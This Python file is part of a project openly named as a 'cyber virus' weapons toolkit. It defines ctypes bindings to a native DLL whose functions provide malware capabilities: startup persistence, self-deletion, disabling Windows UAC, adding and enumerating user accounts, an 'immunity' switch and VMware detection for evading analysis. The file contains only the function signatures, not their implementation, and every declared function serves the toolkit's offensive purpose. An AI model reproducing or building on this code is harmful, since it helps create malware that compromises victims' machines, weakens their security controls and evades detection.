# -*- Config : UTF-8 -*-
# Project Name: Termination Generally Use Cyber Virus Puppet Weapons - TLib/T_Tools
# Version: 4.2.0
# Build Version: ./TConfig/version.ini
# Author: Veyra
# Description:

# Tools
# Some of the tools in this project are complex, practical, and diverse.


from .T_imports import *
from . import T_CDLL

class TDLL(T_CDLL.DLL):
    def __init__(self, DLLPath):
        super().__init__(DLLPath, winmode=0)
        self.SetImmunity.restype = ctypes.c_bool
        self.SetImmunity.argtypes = (ctypes.c_char_p, ctypes.c_char_p)
        self.ClearImmunity.restype = None
        self.ClearImmunity.argtypes = (ctypes.c_char_p, ctypes.c_char_p)
        self.AutoRun_Startup.restype = ctypes.c_bool
        self.AutoRun_Startup.argtypes = (ctypes.c_char_p, ctypes.c_char_p)
        self.SelfDel.restype = ctypes.c_bool
        self.SelfDel.argtypes = ()
        self.CloseUAC.restype = ctypes.c_bool
        self.CloseUAC.argtypes = (ctypes.c_char_p,)
        self.AddUser.restype = None
        self.AddUser.argtypes = (ctypes.c_wchar_p, ctypes.c_wchar_p)
        self.EnumUser.restype = None
        self.EnumUser.argtypes = ()
        self.CreateAutoRun.restype = None
        self.CreateAutoRun.argtypes = ()
        self.IsVMWare.restype = ctypes.c_bool
        self.IsVMWare.argtypes = ()
        self.test.restype = ctypes.c_bool
        self.test.argtypes = ()
